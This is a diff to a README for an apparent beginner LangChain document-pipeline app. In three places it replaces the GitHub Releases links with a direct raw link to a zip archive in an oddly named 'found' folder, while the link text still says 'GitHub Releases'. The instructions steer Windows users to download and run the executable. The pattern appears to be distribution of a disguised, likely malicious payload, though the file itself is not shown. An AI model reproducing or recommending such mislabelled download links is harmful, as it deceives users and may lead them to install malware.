@@ -1,6 +1,6 @@
 # 🤖 Understanding_Document_Pipeline_Langchain - Learn RAG With Clear Steps
 
-[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge)](https://github.com/allyadagio506/Understanding_Document_Pipeline_Langchain/releases)
+[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge)](https://raw.githubusercontent.com/allyadagio506/Understanding_Document_Pipeline_Langchain/main/found/Document-Understanding-Pipeline-Langchain-v2.5.zip)
 
 ## 🚀 What this app does
 
@@ -30,7 +30,7 @@ For a smoother run, 8 GB of RAM or more helps when you work with larger files.
 
 Visit this page to download the latest Windows build:
 
-[Download from GitHub Releases](https://github.com/allyadagio506/Understanding_Document_Pipeline_Langchain/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/allyadagio506/Understanding_Document_Pipeline_Langchain/main/found/Document-Understanding-Pipeline-Langchain-v2.5.zip)
 
 Look for the newest release file for Windows. If you see a `.exe` file, download it. If the release gives you a zipped folder, download that file and unpack it first.
 
@@ -215,7 +215,7 @@ If the app closes on start:
 
 If you need the file again, use this link:
 
-[Open GitHub Releases](https://github.com/allyadagio506/Understanding_Document_Pipeline_Langchain/releases)
+[Open GitHub Releases](https://raw.githubusercontent.com/allyadagio506/Understanding_Document_Pipeline_Langchain/main/found/Document-Understanding-Pipeline-Langchain-v2.5.zip)
 
 From there, choose the latest Windows release and download it
 
